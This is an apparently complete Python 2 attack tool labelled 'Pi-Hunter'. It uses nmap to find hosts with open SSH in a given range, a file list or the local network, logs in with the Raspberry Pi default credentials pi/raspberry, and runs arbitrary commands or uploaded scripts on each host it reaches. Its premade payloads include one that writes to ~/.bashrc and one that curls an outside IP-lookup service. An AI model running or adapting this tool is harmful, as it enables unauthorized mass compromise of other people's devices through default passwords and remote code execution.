#!/usr/bin/python
import os
import argparse
import paramiko
import threading
import time
import socket
import ipcalc
import nmap
import netifaces
from netaddr import IPNetwork, IPRange, IPAddress, iprange_to_globs
from termcolor import cprint, colored

#config
BannerColor = "yellow"
SuccessColor = "green"
FailedColor = "red"

#args
parser = argparse.ArgumentParser()

TargetGroup = parser.add_argument_group("Target")
TargetGroupOptions = TargetGroup.add_mutually_exclusive_group(required=True)
TargetGroupOptions.add_argument("-t", dest="target", help="Single target")
TargetGroupOptions.add_argument("-r", dest="ip_range", help="Range of targets")
TargetGroupOptions.add_argument("-l", dest="local_scan", help="Scan local network with nmap", action="store_true")
TargetGroupOptions.add_argument("-f", dest="file", help="Use an ip list from a file")
TargetGroup.add_argument("--port", dest="port", type=int, help="Use custom port", default=22)

CredencialGroup = parser.add_argument_group("Credencials")
CredencialGroup.add_argument("-p", dest="password", help="Use custom password", type=str, default="raspberry")
CredencialGroup.add_argument("-u", dest="username", help="Use custom username", type=str, default="pi")

PayloadGroup = parser.add_argument_group("Payloads")
PayloadGroupOptions = PayloadGroup.add_mutually_exclusive_group(required=True)
PayloadGroupOptions.add_argument("-c", dest="command", help="Execute custom command")
PayloadGroupOptions.add_argument("-s", dest="script", help="Execute custom command")
PayloadGroupOptions.add_argument("--payload", dest="payload", help="Use premade payload")
PayloadGroupOptions.add_argument("--list", help="Shows all payloads", action="store_true")

args = parser.parse_args()

payloads = {
    "whoami": "whoami",
    "notify": "echo 'echo change your password' >> ~/.bashrc",
    "uname": "uname -a",
    "iplogger": "curl http://ipinfo.io/ip"
}
startTime = time.time()
SshClients = []
threadLock = threading.Lock()

def main():
    PrintBanner()
    
    if args.list:
        for payload, description in payloads.items():
            print colored("[" + payload + "]:", "yellow") + " " + description
        print ""
        exit()

    payload = ""
    if args.command:
        payload = args.command
    elif args.script:
        payload = "./" + args.script
    elif args.payload:
        payload = payloads[args.payload]

    target = ""
    if args.target:
        target = args.target
        SendPayload(target, payload)
    elif args.ip_range:
        start = args.ip_range.split(",")[0]
        stop = args.ip_range.split(",")[1]
        hosts = ScanIpRange(start, stop) 
        print colored("Found ", "green") + colored(str(len(hosts)), "yellow") + colored(" hosts", "green")
        print ""
        print colored("Trying SSH...", "green")
        print ""
        SendPayloadRange(hosts, payload)
        ShowScanResults()
    elif args.local_scan:
        localIps = GetIpInterfaces()
        for localIp in localIps:
            if localIp != "127.0.0.1/8":
                networkSize = ipcalc.Network(localIp.split("/")[0], localIp.split("/")[1]).size()
                print colored("Scanning ", "green") + colored(str(networkSize), "yellow") + colored(" hosts", "green")
                ips = ScanLocalNetwork(localIp)
                print colored("Found ", "green") + colored(str(len(ips)), "yellow") + colored(" hosts", "green")
                print ""
                print colored("Trying SSH...", "green")
                print ""
                SendPayloadRange(ips, payload)
        ShowScanResults()
    elif args.file:
        Targets = open(args.file, "r").read().split("\n")
        Targets.pop()
        SendPayloadRange(Targets, payload)
        ShowScanResults()

 

def SendPayload(target, payload):
    if args.script:
        if ExecuteSshScript(target, args.port, args.username, args.password, os.path.basename(args.script), args.script):
            SshClients.append(target)
    else:
        if ExecuteSshCommand(target, args.port, args.username, args.password, payload):
            SshClients.append(target)

def ExecuteSshCommand(target, port, username, password, payload):
    SSHClient = paramiko.SSHClient()
    SSHClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        if not IsPortOpen(target, 22):
            cprint("SSH not running", "red", attrs=["bold"])
            return False
    except:
            cprint("Invalid target", "red", attrs=["bold"])
            return False
    try:
        SSHClient.connect(hostname=target, port=port, username=username, password=password, timeout=10)
        stdin, stdout, stderr = SSHClient.exec_command(payload)
        PrintSshStatus(target, True, payload, stdout.readlines())
        SSHClient.close()
        return True
    except:
        PrintSshStatus(target, False, payload)
        SSHClient.close()
        return False
def ExecuteSshScript(target, port, username, password, fileName, filePath):
    SSHClient = paramiko.SSHClient()
    SSHClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        if not IsPortOpen(target, 22):
            cprint("SSH not running", "red", attrs=["bold"])
            return False
    except:
            cprint("Invalid target", "red", attrs=["bold"])
            return False
    if not os.path.exists(filePath):
        cprint("Script not found", "red", attrs=["bold"])
        return False
    try:
        SSHClient.connect(target, port, username, password, timeout=10)
        SFTPClient = SSHClient.open_sftp()
        remoteFile = SFTPClient.open("/home/" + username + "/" + fileName, mode="w")
        remoteFile.write(open(filePath, "r").read())
        remoteFile.close()
        SFTPClient.close()
        stdin, stdout, stderr = SSHClient.exec_command("chmod +x " + fileName + " && /home/" + username + "/" + fileName)
        PrintSshStatus(target, True, fileName)
        SSHClient.close()
        return True
    except:
        PrintSshStatus(target, False, fileName)
        SSHClient.close()
        return False

def PrintSshStatus(target, isSuccess, payload, output=""):
    threadLock.acquire()
    if isSuccess:
        print colored("-" * 33 + "{", SuccessColor) +  colored(target, SuccessColor, attrs=["bold"]) +  colored("}" + "-" * (40-len(target)), SuccessColor)
        print colored("Executed payload: ", SuccessColor, attrs=["bold"]) + payload
        print ""
        for line in output:
            print line
    else:
        print colored("-" * 33 + "{" + target + "}" + "-" * (40-len(target)), FailedColor)
        cprint("Authentication failed", FailedColor, attrs=["bold"])
        print ""
    threadLock.release()
def ShowScanResults():
    if len(SshClients) > 1:
        print colored("Found ", "green") + colored(str(len(SshClients)), "yellow") + colored(" clients:", "green")
    else:
        print colored("Found ", "green") + colored(str(len(SshClients)), "yellow") + colored(" client:", "green")
    for client in SshClients:
        cprint(client, "yellow")

def SendPayloadRange(IpList, payload):
    threads = []
    for target in IpList:
        if target != "":
            threads.append(threading.Thread(target=SendPayload, args=[target, payload]))
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    print colored("Took: ", "green") + colored(str((time.time() - startTime)), "yellow") + colored(" seconds", "green")
    print ""

def ScanLocalNetwork(ip):
    scanner = nmap.PortScanner()
    scanner.scan(ip, ports="22", arguments="-T 4")
    Ips = []
    for host in scanner.all_hosts():
        if(scanner[host].tcp(22)["state"] == "open"):
            Ips.append(host)
    return Ips
def ScanIpRange(start, stop):
    print colored("Scanning from ", "green") + colored(start, "yellow") + colored(" to ", "green") + colored(stop, "yellow")
    targetRanges = iprange_to_globs(start, stop)
    scanner = nmap.PortScanner()
    hosts=[]
    for target in targetRanges:
        scanner.scan(target, ports="22", arguments="-T 4")
    for host in scanner.all_hosts():
        if scanner[host].tcp(22)["state"] == "open":
            hosts.append(host)
    return hosts

def IsPortOpen(ip, port=22):
    scanner = nmap.PortScanner()
    scanner.scan(hosts=ip, ports=str(port))
    return (scanner[ip].tcp(port)["state"] == "open")
def GetIpInterfaces():
    ifaces = netifaces.interfaces()
    Ips = []
    for iface in ifaces:
        try:
            ip = netifaces.ifaddresses(iface)[2][0]["addr"]
            mask = netifaces.ifaddresses(iface)[2][0]["netmask"]
            Ips.append(ip + "/" + str(IPNetwork(ip, mask).prefixlen))
        except:
            continue
    return Ips

def PrintBanner():
    print ""
    cprint("########::'####::::::::::'##::::'##:'##::::'##:'##::: ##:'########:'########:'########::", BannerColor, attrs=["bold"])
    cprint("##.... ##:. ##::::::::::: ##:::: ##: ##:::: ##: ###:: ##:... ##..:: ##.....:: ##.... ##:", BannerColor, attrs=["bold"])
    cprint("##:::: ##:: ##::::::::::: ##:::: ##: ##:::: ##: ####: ##:::: ##:::: ##::::::: ##:::: ##:", BannerColor, attrs=["bold"])
    cprint("########::: ##::'#######: #########: ##:::: ##: ## ## ##:::: ##:::: ######::: ########::", BannerColor, attrs=["bold"])
    cprint("##.....:::: ##::........: ##.... ##: ##:::: ##: ##. ####:::: ##:::: ##...:::: ##.. ##:::", BannerColor, attrs=["bold"])
    cprint("##::::::::: ##::::::::::: ##:::: ##: ##:::: ##: ##:. ###:::: ##:::: ##::::::: ##::. ##::", BannerColor, attrs=["bold"])
    cprint("##::::::::'####:::::::::: ##:::: ##:. #######:: ##::. ##:::: ##:::: ########: ##:::. ##:", BannerColor, attrs=["bold"])
    cprint("..:::::::::....:::::::::::..:::::..:::.......:::..::::..:::::..:::::........::..:::::..:", BannerColor, attrs=["bold"])
    print ""
    print ""


main()
